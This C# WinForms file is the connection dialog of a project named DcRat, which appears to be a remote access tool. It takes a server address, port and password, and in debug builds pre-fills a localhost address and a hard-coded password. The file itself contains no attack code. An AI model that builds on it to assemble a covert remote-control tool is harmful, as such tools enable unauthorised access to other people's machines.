using DcRat.Properties;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DcRat
{
    public partial class FormInit : Form
    {
        public FormInit()
        {
            InitializeComponent();
        }

        private void buttonclose_Click(object sender, EventArgs e)
        {
            Environment.Exit(0);
        }

        private void buttonconnect_Click(object sender, EventArgs e)
        {
            if (textBoxasddress.Text==""||textBoxpassword.Text=="")
            {
                MessageBox.Show("Please fill in your address and password");
            }
            else
            {
                string[] address = textBoxasddress.Text.Split(new[] { ":" }, StringSplitOptions.None);
                Settings.Default.IP = address[0];
                Settings.Default.Port = address[1];
                Settings.Default.connectpassword = textBoxpassword.Text;
                this.Close();
            }
        }

        private void FormInit_Load(object sender, EventArgs e)
        {
#if DEBUG
            textBoxasddress.Text = "127.0.0.1:8848";
            textBoxpassword.Text="qwqdanchun";
#endif
        }
    }
}
